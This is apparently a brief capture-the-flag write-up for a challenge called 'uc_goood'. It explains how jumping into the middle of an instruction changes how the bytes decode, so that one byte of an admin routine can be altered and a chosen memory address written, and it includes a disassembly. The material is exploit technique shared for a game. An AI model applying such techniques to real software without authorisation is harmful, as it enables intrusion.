# uc_goood

You can jump into `admin_offset + 1`, and it'll break the original instruction `mov ecx, 12h` into `adc al, BYTE PTR [rax]; add BYTE PTR [rax], al`. So you can change one byte of `ADMIN` by setting `rax`.

I searched a proper `rax` value with `test.py`. I found out this: (when `al = 0x9c`)
```
   0:   48 89 f8                mov    rax, rdi
   3:   48 89 f7                mov    rdi, rsi
   6:   48 89 d6                mov    rsi, rdx
   9:   48 89 ca                mov    rdx, rcx
   c:   4d 89 c2                mov    r10, r8
   f:   4d 89 59 4c             mov    QWORD PTR [r9+0x4c], r11
  13:   8b 4c 24 08             mov    ecx, DWORD PTR [rsp+0x8]
  17:   0f 05                   syscall 
  19:   c3                      ret
```

So you can write to `0xbabecafe233` before `ADMIN` tries to write to it by setting proper `r9`, `r11` values.